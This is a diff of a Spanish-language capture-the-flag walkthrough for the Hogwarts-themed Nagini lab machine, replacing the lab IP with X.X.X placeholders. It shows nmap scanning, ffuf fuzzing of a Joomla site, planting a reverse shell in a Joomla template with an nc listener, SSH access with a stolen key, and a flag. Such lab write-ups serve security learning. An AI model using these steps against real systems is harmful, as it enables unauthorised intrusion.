@@ -41,23 +41,23 @@ Aquí veremos que esta conectado a la subred, los puerto abiertos, las paginas w
 
 Veremos que redes estan conectadas a esta subred con este comando:
 
-```nmap -sP 192.168.221.0/24```
+```nmap -sP X.X.X.0/24```
 
 Para ver los puertos abiertos que tiene la red utilizaremos este comando:
 
-```nmap -sV -sC 192.168.221.8```
+```nmap -sV -sC X.X.X.8```
 
 ### Fuzz
 
 Para fuzzear la web usaremos este comando con una wordlist que tengamos:
 
-```ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://192.168.221.8/FUZZ```
+```ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://X.X.X.8/FUZZ```
 
-```ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://192.168.221.8/joomla/FUZZ```
+```ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://X.X.X.8/joomla/FUZZ```
 
 Para ver solo archivos con extensión .txt,.php,.html
 
-```ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.221.8/FUZZ -e .txt,.html,.php -ic```
+```ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://X.X.X.8/FUZZ -e .txt,.html,.php -ic```
 
 > -ic para quitar basurilla del fuzz
 
@@ -87,7 +87,7 @@ Después de esto seguiremos estos comandos:
 cd src
 ./curl --http3 https://quic.nagini.hogwarts
 ```
-> 192.168.221.8 quic.nagini.hogwarts en el archivo /etc/hosts
+> X.X.X.8 quic.nagini.hogwarts en el archivo /etc/hosts
 
 En esa página web leemos esto:
 
@@ -188,7 +188,7 @@ Iremos a esta dirección para modificar un index.php como una [reverse shell](ht
 **Extension --> Templates -->  Templates (Site) --> Customise (Protostar)**
 
 Ahora explotaremos la vulnerabilidad poniendo un puerto abierto ```rlwrap nc -nvlp 4444``` y abriendo la reverse shell desde esta url:
-```http://192.168.221.8/joomla/templates/protostar/index.php```
+```http://X.X.X.8/joomla/templates/protostar/index.php```
 
 Para tener un shell interactiva usaremos este comando:
 
@@ -221,7 +221,7 @@ Después de esto haremos este comando para copiarlo en la carpeta .ssh:
 > El -p es para cuando copies el archivo no se pierdan los permisos dados anteriormente
 
 Gracias a esto nos conectaremos la ssh privada en local:
-```ssh hermoine@192.168.221.8 -i id_rsa```
+```ssh hermoine@X.X.X.8 -i id_rsa```
 
 Aquí la primera flag: **horcrux_{NDogSGVsZ2EgSHVmZmxlcHVmZidzIEN1cCBkZXN0cm95ZWQgYnkgSGVybWlvbmU=}**
 
